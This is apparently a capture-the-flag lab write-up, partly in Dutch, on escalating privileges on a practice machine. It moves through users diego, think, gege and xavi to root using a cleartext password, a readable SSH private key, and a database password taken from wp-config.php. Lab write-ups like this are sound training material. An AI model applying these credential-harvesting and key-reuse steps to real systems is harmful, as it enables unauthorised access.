## Privilege Escalation

#### Summary

We are in the shell right now, got the password of user diego

#### Diego - Recon

```
www-data@ip-10-10-236-141:/var/www/wordpress/wp-admin$ su diego 
su diego 
Password: sandiegocalifornia

diego@ip-10-10-236-141:/var/www/wordpress/wp-admin$ whoami
whoami
diego
```

*Further scanning of the /home directory got us into /home/think directory*

*Doing ls -la got use a .ssh file that we can read as user Diego*

```
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 8 root  root     4096 Oct 14 07:42 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
```

*Cd into this directory gives the following files*

```
diego@ip-10-10-236-141:/home/think/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub
```

*Found the private key*

```
[do the room!]
```

*Using the privkey to get ssh access to user Think*

```
┌──(root㉿kali)-[/smol]
└─# ssh -i priv_key think@smol.thm
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 14 Oct 2025 08:14:33 AM UTC

  System load:  0.03              Processes:             152
  Usage of /:   69.0% of 9.75GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for ens5: 10.10.236.141
  Swap usage:   0%

 * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support on 31 Ma
 
   For more details see:
   https://ubuntu.com/20-04

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

37 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

think@ip-10-10-236-141:~$
```

*Think mag als gege user runnen*

```
su gege
```

*Na cracken van hash zip file wachtwoord in wp-config.php*

```

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

```

```
xavi@ip-10-10-205-187:~$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on ip-10-10-205-187:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-10-205-187:
    (ALL : ALL) ALL
```

*Get root privileges*

```
sudo su
```







